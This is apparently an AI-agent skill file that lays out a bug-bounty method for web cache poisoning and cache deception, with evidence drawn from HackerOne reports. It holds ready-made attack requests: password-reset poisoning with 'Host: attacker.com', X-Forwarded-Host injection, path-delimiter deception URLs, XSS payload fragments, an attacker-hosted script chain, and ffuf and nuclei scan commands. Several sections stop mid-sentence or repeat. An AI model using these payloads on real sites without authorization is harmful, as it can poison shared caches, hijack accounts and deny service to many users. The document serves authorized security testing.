---
name: bbhunt-web-cache
description: "Use for unkeyed headers, cache-key normalization differences, static-extension deception, and cache deception of authenticated pages. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Web Cache Poisoning and Deception — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Fingerprint the cache: identify cache headers, key components, and which headers/params are ignored by the key.
2. Find a reflection that reaches the cached response body (not only a header).
3. Prove poisoning with a unique marker and a second request from a different context (no your headers) observing the marker.
4. Check normalization differences between cache key and origin routing (dots, slashes, case, encoded separators).
5. For cache deception, test whether a victim's authenticated response can be cached under a static-looking path.
6. Bound the test strictly: never poison a widely used production path with harmful content.

### Signals

- CDN or reverse proxy with caching rules
- Headers reflected in cached responses but not included in the cache key
- Static-extension paths served through a dynamic app

### Kill criteria

- No reflection in cacheable responses, or all reflected inputs are keyed.
- Marker visible only with your own headers — no cross-request effect.
- Test would affect real users beyond the proof; stop and report the design flaw carefully.

### Escalation chains

- Cache poisoning -> stored XSS on a trusted page.
- Cache deception -> authenticated page served to attacker.

### Veteran tip

Always use a unique cache-buster so a proof does not persist and harm other users.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Identify cache layers, keys, and TTLs from headers and behavior.
- Find unkeyed inputs: X-Forwarded-Host, X-Host, X-Original-URL, cookies, headers reflected in responses.
- Test cache deception with static extensions on authenticated routes.
- Check normalization mismatches between cache and origin.

### Deeper checklist

- Identify cache layers, cache keys, and TTLs via response headers and behavior.
- Find unkeyed inputs: X-Forwarded-Host, X-Host, X-Original-URL, cookies, headers reflected in responses.
- Test cache deception with static extensions on authenticated routes.
- Check normalization mismatches between cache and origin (encoding, path, host).
- Demonstrate poisoning a victim response or leaking another user's data.
- Avoid persistent poisoning; use a cache-buster where possible.

### Autonomous Testing Priority

**Two distinct attacks live under this skill — target the simpler one first.**

**Attack 1 — Password Reset Poisoning (Host header injection):**

The app uses the `Host` header to construct the password reset link in the email. Inject an attacker-controlled hostname; the victim's reset email contains a link to your server.

```
POST /forgot-password
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com

email=victim@target.com
Content-Type: application/x-www-form-urlencoded
```

Use a distinctive hostname you control or can identify in the response. **Proof:** the injected hostname appears in the response body (some apps reflect the generated reset link), or the action succeeds (2xx with a "reset email sent" message) after injection — confirming the poisoned link would be sent to the victim.

Try multiple host headers — apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).

**Attack 2 — Web Cache Poisoning:**

Inject the attacker-controlled hostname into `X-Forwarded-Host` on a GET request for a cacheable page. If the hostname is reflected in the response body AND the response gets cached, subsequent visitors receive the poisoned response.

Check for cache signals in the response: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: <nonzero>`, or `Via: cloudfront/varnish/fastly`.

**Proof for both:** injected value reflected in response body, or action completed successfully despite the manipulated header.

---

### Step-by-Step Hunting Methodology

1. **Map cache infrastructure.** Send a GET to the target and inspect response headers. Identify the caching layer (Cloudflare, Fastly, Varnish, Nginx). Note `Age`, `X-Cache`, `CF-Cache-Status` headers.

2. **Identify cache key components.** Send two identical requests — if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).

3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.com` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=<random>`) so the probe lands on a cache MISS under a throwaway key — this verifies reflection without prematurely storing a live poison entry under the real, victim-shared cache key. (Param Miner's "Guess headers" mode is the canonical Burp tool for discovering these unkeyed headers/parameters automatically.)

4. **Test URL path manipulation (Web Cache Deception).** Append fake static extensions to dynamic endpoints:
   - `GET /account/profile.css`
   - `GET /dashboard/settings.jpg`
   - `GET /affiliate-link/target.js`
   Check if the server returns dynamic content AND the cache stores it.

5. **Test for DoS via cache poisoning.** Send a request with a header that causes a 4xx/5xx error and check if that error response gets cached:
   - Malformed `Host` header
   - `X-Forwarded-Host` pointing to an invalid host
   - Oversized headers that trigger bac

### A. Discovery checklist — concrete places, params, headers, infra signals to look

- Classify the cache before attacking it. Identify the provider from headers: `X-Cache` / `X-Cache-Status` / `X-Who-Made-This`, `CF-Cache-Status` (Cloudflare), `X-Served-By` + `X-Cache` (Fastly/Varnish), `Age`, `Via`, `Server: cloudfront` / `x-amzn`. Values to watch: `hit`, `miss`, `dynamic`, `refresh`, `HIT`, `MISS`.
- Distinguish the two games up front: poisoning = manipulate the **cache key** (unkeyed inputs) so a malicious response is served to everyone with that key; deception = manipulate **cache rules** so a dynamic/victim response is stored as if static. They chain: "Cache-What-Where" turns an otherwise unexploitable open redirect or self-XSS into mass XSS.
- Harvest unkeyed inputs with Param Miner ("Guess headers" / "Guess params", plus "Add dynamic cachebuster"). Classic unkeyed carriers: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Scheme`, `Accept-Language`, cookies, `utm_*` / `ref` query params.
- Look for absolute URLs and script imports built from headers (`<script src="//host/resources/js/tracking.js">`), 302 redirects whose `Location` uses a header, error pages that reflect the request path, and "cart/token in URL" endpoints. These are the reflectors that make poisoned responses harmful.
- Identify cacheable suffixes and prefixes: static extensions `.css`, `.js`, `.ico`, `.exe`, `.txt`; static directories `/static`, `/assets`, `/wp-content`, `/media`, `/templates`, `/public`, `/shared`; exact filenames `robots.txt`, `favi

### Signals and surfaces

### Signal

- Reports: **68** · paid: **16**
- Median bounty **$650** · p90 **$9,700** · max **$18,900** · total **$43,206**
- Median upvotes **37**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| PayPal | 2 | $28,600 | 1536 |
| Shopify | 5 | $9,000 | 551 |
| HackerOne | 3 | $2,600 | 522 |
| GSA Bounty | 3 | $750 | 131 |
| InnoGames | 1 | $550 | 82 |
| Postmates | 1 | $500 | 343 |
| Mail.ru | 3 | $400 | 74 |
| Algolia | 2 | $400 | 73 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`any CDN/proxy path` `static extensions` `X-Forwarded-*` `Host` `cookies`

### Crown Jewel Targets

Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously — one request, mass exploitation. Payout scales with blast radius.

**Highest-value targets:**
- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges) — poisoning these affects every visitor globally
- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts) — session hijack or affiliate fraud potential
- **Gaming platforms with update servers** (rockstargames updates.* domains) — DoS on update delivery = widespread client breakage
- **Authentication endpoints** served through caches — leads to account takeover (the highest severity variant)
- **Asset CDNs** (JS/CSS delivery) — XSS payload delivery at scale
- **SaaS multi-tenant platforms** — one poisoned response bleeds into all tenants sharing a cache key

**Asset types that pay most:** CDN hostnames, subdomain-per-tenant patterns, update/download servers, login/account pages cached incorrectly, affiliate link shorteners.

---

### Attack Surface Signals

**URL patterns to look for:**
- `cdn.`, `assets.`, `static.`, `updates.`, `downloads.` subdomains
- URL path structures with extensions that look static: `/path/to/page.css`, `/account.php/nonexistent.jpg`
- Affiliate/link shortener endpoints: `/link/`, `/go/`, `/ref/`, `/out/`
- Paths that mix dynamic content with cacheable-looking URLs

**Response headers that signal a cache:**
```
X-Cache: HIT / MISS
X-Cache-Status: HIT
CF-Cache-Status: HIT / MISS (Cloudflare)
Age: <nonzero>
Via: 1.1 varnish / cloudfront / fastly
Cache-Control: public, max-age=...
Surrogate-Control: max-age=...
X-Served-By: cache-...
```

**JS/tech stack signals:**
- Fastly, Varnish, Cloudfront, Akamai, Nginx proxy_cache in response headers
- Shopify/Linkpop stacks with third-party integrations
- Platforms using path-based routing without normalizing trailing segments
- Servers that reflect unvalidated headers into responses (Host, X-Forwarded-Host, X-Original-URL)

**Dangerous header candidates (unkeyed inputs):**
```
X-Forwarded-Host
X-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Forwarded
X-HTTP-Method-Override
```

---

### Techniques, payloads and bypasses

### Payloads & probes

- `X-Forwarded-Host: evil.com` `X-Host: evil.com` `X-Forwarded-Scheme: http`
- `/account/profile.css` `/account/profile%2ecss` `/account/profile;.css`
- Cache buster -> `?cb=123` then poison the canonical URL

### Bypass tricks

- Use unkeyed headers that the origin reflects into redirects or HTML.
- Exploit path normalization: `/x/..%2faccount`.
- Poison only your own cache key, then request the victim URL.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **DoS on PayPal via web cache poisoning** — `#622122` · PayPal · $9,700 · ▲851
  > On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'.
- **Stored XSS on https://paypal.com/signin via cache poisoning** — `#488147` · PayPal · $18,900 · ▲685
  > I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn
- **Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** — `#591302` · Automattic · $0 · ▲405
  > The WP-JSON implementation on some wordpress.com websites I've tested is vulnerable to denial of service where by an attacker can provide an arbitrary `Origin` header in the request, which is then echoed back in the response via the…
- **DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com** — `#1695604` · Shopify · $3,800 · ▲266
  > So, when an attacker sends a request with replacing the slashes with backslashes for a certain file, the server will return 404 Not Found error page, and this error will be saved into the cache and any upcoming requests to this file will return 404 Not Found…
- **Denial of service via cache poisoning** — `#409370` · HackerOne · $2,500 · ▲253
  > An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache 

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 5× | `%00` |
| 1× | `GET /assets/static/js/8.9572d249.chunk.js?hackerone=poc HTTP/2 / Host: hackerone.com / x-forwarded-scheme: http` |
| 1× | `</script` |
| 1× | `</sc"ript>` |
| 1× | `GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1 / Host: downloads.exodus.com / Authorization: SharedKeyLite myaccount` |
| 1× | `https://amazon.ca/dp/[VICTIM-PRODUCT-ID]/../[ATTACKER-PRODUCT-ID]` |
| 1× | `https://amazon.ca/dp/███/../████████` |
| 1× | `GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.c` |
| 1× | `GET /patches/gtaiv/notes_title_update_6/GTAIVPC_TU6_Patch_Notes_FR.txt?donotpoisoneveryone=1 HTTP/1.1 / Host: updates.rockstargames.com / tr` |
| 1× | `X-Forwarded-Host : foobar.pl"><img src=x onerror=blah>` |
| 1× | `GET /u/x.css HTTP/1.1 / Host: try.discourse.org / <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />` |
| 1× | `GET /u/x.css HTTP/1.1` |
| 1× | `POST /users/$username/preferences/email.json HTTP/1.1 / / _method=PUT&email=$attacker_email&authenticity_token=$csrf_token` |
| 1× | `/u/$rand.css` |
| 1× | `<% woff2_url = "#{asset_path("fontawesome-webfont.woff2")}?#{font_domain}&v=4.7.0".html_safe %> / <link rel="preload" href="<%=woff2_url%>` |
| 1× | `GET /?xx HTTP/1.1 / Host: meta.discourse.org / X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>` |
| 1× | `https://blackfan.ru/b

### Common Root Causes

1. **CDN misconfiguration — caching based on URL path only.** Engineers configure cache rules like "cache everything matching `*.js`" without realizing the path can be appended to dynamic routes. The origin server ignores the extra path segments, but the CDN uses them as cache keys.

2. **Unkeyed header forwarding.** Developers configure reverse proxies to forward `X-Forwarded-Host` to backends for URL generation (canonical links, redirects, password reset emails) without including it in the cache key. The CDN caches the poisoned response.

3. **Web Cache Deception via permissive routing.** Frameworks that normalize URLs (e.g., Rails, Express) accept `/account/settings.css` and serve the same response as `/account/settings`. The CDN sees a `.css` extension and applies aggressive caching rules.

4. **Shared caching of multi-tenant responses.** SaaS platforms that use a single CDN without tenant isolation in the cache key allow cross-tenant cache poisoning.

5. **Error responses cached without thought.** Backend errors (404, 500) triggered by attacker-controlled input get cached, causing DoS for legitimate users. Developers implement caching without excluding error status codes.

6. **Lazy `Vary` header implementation.** Developers know they should add `Vary: X-Forwarded-Host` but forget, or CDNs strip/ignore `Vary` headers entirely (Cloudflare historically strips Vary on some asset types).

7. **Third-party integrations with URL reflection.** Affiliate/link tracking systems (like Shopify Linkpop) reflect the destination URL in metadata, canonical tags

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Basic poisoning cycle: (1) find unkeyed input reflected into a response, (2) elicit a harmful response (XSS, open redirect, 500), (3) get it cached under a victim's key, then fetch clean to confirm. Always add a unique cachebuster request parameter while testing so you don't poison real users.
- Duplicate-header bypass of first-header-only validation:
  ```
  GET / HTTP/1.1
  Host: target
  X-Forwarded-Host: target
  X-Forwarded-Host: evil.com
  ```
  Front-end inspects the first value; back-end concatenates into `target, evil.com` or uses the second.
- Path-mapping deception (REST origin vs traditional cache):
  `/user/123/profile/wcd.css` -> origin reads `/user/123/profile`, cache stores `.css`.
- Delimiter deception: `/settings/users/list;aaa.js` where the origin truncates at `;` (Spring) but the cache sees the full path with `.js`. Test every ASCII char both raw and URL-encoded with Burp Intruder (disable automatic payload encoding).
- Encoded-delimiter / decoding mismatch: `/profile%23wcd.css` (origin decodes `%23` to `#` and truncates; cache doesn't), `/myaccount%3fwcd.css` (cache applies `.css` rule then decodes `%3f` to `?` before forwarding).
- Normalization deception shapes from "Gotta cache 'em all":
  - Cache normalizes, origin does not: `/<dynamic>%2f%2e%2e%2f<static-dir>` — pair it with an origin-only delimiter, e.g. `/profile;%2f%2e%2e%2fstatic`.
  - Origin normalizes, cache does not: `/<static-dir>/..%2f<dynamic>` e.g. `/assets/..%2fprofile`. Encode every dot-segment slash so the

_...and 2 more sections in `references/unified-method.md`._

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

1. **What can the attacker DO right now?**
   The attacker must be able to poison a cache entry and then demonstrate that a *separate, unauthenticated request* from a different client/IP receives the poisoned response — not just their own browser. If only the attacker sees the effect, it's not cache poisoning.

2. **What does the victim LOSE?**
   Must be one of: (a) session/account compromise via reflected credentials in poisoned response, (b) execution of attacker-controlled JS via poisoned asset, (c) service denial where legitimate requests return error responses, or (d) sensitive data disclosure (account details cached and served to other users). "Weird response headers" alone is not impact.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: send the poisoning request → wait for cache store → fetch the URL from incognito/different IP → observe poisoned response. If you can't demonstrate this clean reproduction with a second client, the cache may not actually be storing the poison and the report isn't ready.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Prove caching, not just cacheability: send once -> `X-Cache: miss`, resend same key -> `hit` with increasing `Age`. A `Cache-Control: public, max-age=...` alone only suggests cacheability; some caches override it.
- Poison once, then fetch with a **clean** request (no injected header, or a normal browser) on the same key. If the clean request receives your payload, poisoning is real. If you must add a cachebuster during testing, remove it for the final proof.
- For deception, the victim response must contain sensitive data, not merely a static file. Inspect the cached body (API keys, CSRF tokens, session state) — header-only confirmation is insufficient.
- An unkeyed input alone is not a finding. Require that the origin actively uses it and that the resulting response is cached and harmful. Duplicate the "clean" fetch from a second session/IP to demonstrate cross-user impact.
- Watch for self-inflicted cache poisoning: always use unique cache keys during discovery; never leave a poisoned production entry for real users. If you do, purge or let it expire and document the cleanup.
- Browser-constraint check: a payload needing unencoded `#`, `{`, `<`, `>` or raw CRLF may be rewritten by the browser. For deception the link must survive browser normalization — re-test the final URL in a real browser, not only in Repeater. Poisoning does not need a browser link, so it can use those characters directly.
- Defensive framing for reports: dynamic responses should carry `Cache-Control: no-store, private`; ensu

### Escalation and related chains

### Escalation chains

- Cache poisoning -> stored XSS.
- Cache deception -> PII theft.

### Related Skills & Chains

- **`xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
- **`request-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
- **`auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
- **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the poisoned

### Related Skills & Chains

- **`hunt-xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
- **`hunt-http-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
- **`hunt-auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
- **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: 

### Tools and wordlists

### Tools

`Burp` · `Web Cache Vulnerability Scanner` · `Param Miner`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_web-cache.txt` | 53 |
| `~/.local/share/hackerone-reports/wordlists/params_web-cache.txt` | 29 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_web-cache.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_web-cache.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Find unkeyed headers and cache-deception paths manually; templates only cover known patterns.

```sh
nuclei -u https://target -tags cache \
       -severity low,medium,high,critical -rl 40 -o nuclei_web-cache.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/cache-poisoning-fuzz.yaml \
       -rl 40 -o nuclei_web-cache_cache-poisoning-fuzz.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic/cache-poisoning.yaml \
       -rl 40 -o nuclei_web-cache_cache-poisoning.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-web-cache`
- `hunting` — `web-cache`
- `cbh` — `hunt-cache-poison`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
